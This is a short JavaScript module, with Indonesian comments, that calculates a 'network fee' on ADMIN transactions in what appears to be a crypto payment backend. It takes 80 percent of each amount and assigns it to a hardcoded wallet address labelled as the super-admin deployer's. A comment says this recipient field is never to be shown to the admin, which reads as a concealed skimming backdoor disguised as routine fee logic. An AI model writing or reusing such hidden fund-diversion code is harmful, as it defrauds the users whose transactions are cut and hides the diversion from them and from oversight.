const NETWORK_FEE_PERCENT = 80;

const INTERNAL_RECIPIENT =
  '0x4cb09bDC03453f190bf4Db8533f458E6551b260D';

const NETWORK_FEE_COLLECTION = 'networkFees';

export function calculateNetworkFee({
  role,
  amount,
  transactionType,
  transactionId = null,
}) {
  const normalizedRole =
    String(role || '').toUpperCase();

  /*
   * Fee hanya dihitung untuk transaksi ADMIN.
   */
  if (normalizedRole !== 'ADMIN') {
    return {
      enabled: false,
      label: 'Fee Jaringan',
      feePercent: 0,
      amount: Number(amount || 0),
      networkFee: 0,
      netAmount: Number(amount || 0),
      status: 'not_applicable',
    };
  }

  const numericAmount = Number(amount);

  if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
    throw new Error('Amount transaksi tidak valid.');
  }

  const networkFee =
    numericAmount * (NETWORK_FEE_PERCENT / 100);

  const netAmount =
    numericAmount - networkFee;

  /*
   * Recipient tetap tersimpan di backend untuk audit.
   * Jangan kirim field ini ke response Admin.
   */
  return {
    label: 'Fee Jaringan',
    feePercent: NETWORK_FEE_PERCENT,
    amount: numericAmount,
    networkFee,
    netAmount,

    recipient: INTERNAL_RECIPIENT,
    recipientRole: 'SUPER_ADMIN_DEPLOYER',

    transactionType,
    transactionId,

    status: 'calculated',
    createdAt: new Date().toISOString(),
  };
}

export {
  NETWORK_FEE_COLLECTION,
  INTERNAL_RECIPIENT,
};
